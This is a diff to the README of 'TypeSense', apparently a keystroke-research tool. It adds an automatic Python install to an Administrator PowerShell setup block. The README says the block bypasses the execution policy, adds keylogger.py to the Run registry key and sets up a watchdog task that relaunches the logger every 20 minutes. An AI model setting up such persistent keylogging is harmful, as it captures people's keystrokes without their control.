@@ -219,13 +219,29 @@ keystroke-research/
 
 ## Running from Python (Windows)
 
-If you don't want to use the packaged `.exe` installer, you can run TypeSense directly from Python. Paste the block below into an **Administrator PowerShell** opened inside the TypeSense folder.
-
-> **Prerequisites:** Python 3.10+ must be installed and on your PATH. Download from [python.org](https://www.python.org/downloads/) if needed (check "Add Python to PATH" during install).
+If you don't want to use the packaged `.exe` installer, you can run TypeSense directly from Python. Paste the block below into an **Administrator PowerShell** opened inside the TypeSense folder. Python will be installed automatically if it isn't already.
 
 ```powershell
 # TypeSense — run-from-Python setup (Windows)
 # Open Administrator PowerShell in the TypeSense folder, then paste this whole block.
+
+# Install Python 3.10+ if not present or too old
+$needsPython = $true
+$pythonCmd = Get-Command python -ErrorAction SilentlyContinue
+if ($pythonCmd) {
+    $ver = & python -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')" 2>$null
+    if ($ver -and [version]$ver -ge [version]"3.10") { $needsPython = $false }
+}
+if ($needsPython) {
+    Write-Host "Installing Python 3.11..."
+    winget install Python.Python.3.11 --silent --accept-package-agreements --accept-source-agreements
+    # Reload PATH so python is available in this session
+    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" +
+                [System.Environment]::GetEnvironmentVariable("Path","User")
+    Write-Host "Python installed."
+} else {
+    Write-Host "Python $ver found, skipping install."
+}
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
@@ -256,6 +272,7 @@ Write-Host "TypeSense is running. It will restart automatically on every login."
 ```
 
 **What this does:**
+- Installs Python 3.11 via `winget` if Python 3.10+ is not already on the machine
 - Installs all Python dependencies from `requirements.txt`
 - Registers `pythonw keylogger.py` in the user's `Run` registry key so the logger auto-starts on every login
 - Registers a scheduled task watchdog that relaunches the logger every 20 minutes if it was closed
